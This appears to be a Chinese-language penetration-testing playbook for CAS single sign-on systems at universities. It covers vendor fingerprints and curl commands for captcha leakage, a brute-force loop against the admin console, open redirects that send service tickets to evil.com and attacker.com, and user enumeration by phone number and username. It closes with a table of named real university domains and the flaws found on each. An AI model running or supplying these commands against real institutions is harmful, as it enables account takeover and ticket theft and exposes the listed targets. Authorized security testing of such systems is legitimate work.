# CAS (Central Authentication Service) 漏洞测试模式

## 目的
教育机构广泛使用CAS统一身份认证系统。本文档记录CAS系统的常见漏洞模式和测试方法。

## CAS系统指纹识别

### 常见CAS实现
| 指纹 | 供应商 | 特征 |
|------|--------|------|
| lyuapServer | 联奕科技(Lianyi) | 路径: /lyuapServer/login, 版权: Copyright 2004-2017 LIANYI TECHNOLOGY CO.,LTD. |
| ly_web_casconsole | 联奕科技(Lianyi) | 管理控制台: /ly_web_casconsole/system/login!login.action |
| ycServer | 金智教育 | CAS SSO |
| login-wisedu_v1.0.js | 金智教育 | JS文件名，含pwdDefaultEncryptSalt |
| CacheTicketRegistry | 金智教育 | com.wisedu.authserver.ticket.registry |
| SWUI / sw-ui | 树维信息 | CAS/一站式服务大厅 |
| CAS 5.x | Apereo | 开源CAS |

### 金智教育CAS专项测试
见 `references/wisedu-cas-testing-patterns.md` — 金智CAS完整漏洞测试模式：密钥泄露、会话固定、Status端点信息泄露、service参数白名单校验。含指纹命令和报告模板。

### 联奕科技CAS指纹命令
```bash
# 检测lyuapServer (联奕科技统一身份认证平台)
curl -sk 'https://<target>/lyuapServer/login' | head -20
# 特征: title含"统一身份认证平台", 引用lyuapServer/js/cas.js, RSA加密

# 检测ly_web_casconsole (联奕CAS管理后台)
curl -sk 'https://<target>/ly_web_casconsole/system/login!logincheck.action' \\\n  -X POST -d 'myusername=admin&password=123456&captcha=1234'
```

## 高危漏洞模式

### 1. 验证码明文泄露
**特征**: getyzm.action返回JSON包含rand字段
```bash
curl -s 'https://<target>/ly_web_casconsole/system/login!getyzm.action' | grep -oP '\"rand\":\"\\K[^\"]+'\n# 返回: \"6198\" (验证码明文)
```
**危害**: 结合无账号锁定，可暴力破解管理后台

### 2. 客户端验证码校验
**特征**: 密码找回页面JS直接比对验证码值
```bash
curl -sk 'https://<target>/safe/yanzhengma.jsp?0.123456'\n# 返回: 3847 (4位数字)
```
**绕过方法**: 直接调用后端接口，跳过客户端验证码检查

### 3. 无账号锁定机制
**特征**: 连续多次失败登录不触发锁定
```bash
for i in $(seq 1 20); do\n  RAND=$(curl -s -c /tmp/cas_${i}.txt 'https://<target>/ly_web_casconsole/system/login!getyzm.action' | grep -oP '\"rand\":\"\\K[^\"]+')\n  curl -sk -b /tmp/cas_${i}.txt 'https://<target>/ly_web_casconsole/system/login!logincheck.action' \\\n    -X POST -d \"myusername=admin&password=test${i}&captcha=${RAND}\" 2>/dev/null | grep -oP '\"message\":\"[^\"]*\"'\ndone
```

### 4. CAS开放重定向 (无白名单)
**特征**: service参数未校验，可注入任意URL
```bash
curl -sk 'https://<target>/lyuapServer/login?service=https://evil.com/steal-ticket' | grep -oP 'action=\"[^\"]*\"'\n# 返回: action=\"/lyuapServer/login;jsessionid=xxx?service=https://evil.com/steal-ticket\"\n```

### 5. CAS Open Redirect 子域名拼接绕过白名单 (gxnu.edu.cn, 2026-06-09)
**特征**: CAS白名单仅检查service参数是否包含合法域名字符串, 而非完整域名验证
```bash
# 子域名拼接绕过
curl -sk 'https://sso.<target>/cas/login?service=http://ehall.<target>.attacker.com' | grep 'action='
# 预期: action="/cas/login?service=http://ehall.<target>.attacker.com"

# 用户信息字段绕过
curl -sk 'https://sso.<target>/cas/login?service=http://ehall.<target>@evil.com' | grep 'action='

# 对比: 未注册域名应返回"未认证授权服务"
curl -sk 'https://sso.<target>/cas/login?service=http://evil.com' | grep '未认证'
```
**要点**:
- 白名单逻辑: `if (service.contains("合法域名"))` 而非 `if (hostname in whitelist)`
- 子域名拼接: `合法域名.attacker.com` 包含合法域名字符串
- 用户信息字段: `合法域名@evil.com` 浏览器解析hostname为evil.com
- 验证: 页面form action必须包含恶意域名, 而非返回"未认证授权服务"
- 对比测试: 需要测试未注册域名(如http://evil.com)确认白名单存在
- 已注册service域名可通过CAS serviceValidate端点枚举

### 6. 联奕CAS SMS用户枚举 (lyuapServer)
**特征**: /lyuapServer/MsmInfo 端点对已绑定/未绑定手机号返回不同状态码
```bash
curl -sk 'https://<target>/lyuapServer/MsmInfo' -X POST \\\n  -H 'X-Requested-With: XMLHttpRequest' \\\n  -d 'phonenumber=13800138000&phonecode=<captcha>'\n# 返回: \"3\" = 未绑定, \"1\" = 已绑定, \"2\" = 已发送(已绑定+频率限制)
```

### 7. 密保问题校验逻辑缺陷
**特征**: checkquestionbinding对所有用户返回true
```bash
curl -sk 'https://<target>/safe/checkquestionbinding.jsp' -X POST -d 'account=admin'\ncurl -sk 'https://<target>/safe/checkquestionbinding.jsp' -X POST -d 'account=nonexistentuser12345'\n# 如果都返回true，则存在逻辑缺陷
```

## SUDY (树维) CAS 漏洞模式

### 指纹识别
- 登录页路径: `/sso/login`
- 主题目录: `/sso/themes/sudy_njsj/`
- JS文件: `/sso/js/cas.js`, `/sso/js/security.js` (RSA加密)

### 1. REST API 用户名枚举 (中危)
**特征**: `/sso/v1/tickets` 端点对存在/不存在用户返回不同错误
```bash
# 存在的用户 → FailedLoginException
curl -sk -X POST -H 'Content-Type: application/x-www-form-urlencoded' \\\n  -d 'username=admin&password=wrongpass' 'http://sso.<target>/sso/v1/tickets'\n# 返回: {\"authentication_exceptions\": [\"FailedLoginException\"]}

# 不存在的用户 → AccountNotFoundException
curl -sk -X POST -H 'Content-Type: application/x-www-form-urlencoded' \\\n  -d 'username=nonexistentuser12345&password=wrongpass' 'http://sso.<target>/sso/v1/tickets'\n# 返回: {\"authentication_exceptions\": [\"AccountNotFoundException\"]}
```

### 2. SUDY IDS 密码找回系统信息泄露
**特征**: imp子域运行SUDY IDS密码找回系统，多个API无需认证
```bash
# 安全问题列表(无需认证)
curl -sk 'http://imp.<target>/_web/_apps/ids/user/passQuestion.json?domainId=1'

# 错误页面泄露内部IP
curl -sk 'http://imp.<target>/_web/_apps/ids/api/passwordRecovery/new.rst' | grep 'value='
```

## 已测试目标

| 目标 | 发现漏洞 | 技术栈 |
|------|---------|--------|
| gxnu.edu.cn | CAS Open Redirect(子域名拼接绕过)+CORS *+creds+ehall JSONP未授权API | 自定义CAS+金智ehall(Tomcat7.0.81)+SUDY CMS |
| xjjtedu.com | 11个(高1/中6/低4) | 蓝盾CAS+Tomcat7+Shiro+CoCall |
| xjjtxy.cn | CAS Open Redirect+管理后台暴露+SMS用户枚举+CoCall公网暴露 | 联奕CAS(lyuapServer)+Liferay Portal+Tomcat 7.0.109 |
| nau.edu.cn | REST API用户名枚举+内部IP泄露+HTTPS降级+status框架泄露+空CSRF+IDS密码找回信息泄露 | SUDY CAS+nginx/1.22.0 |
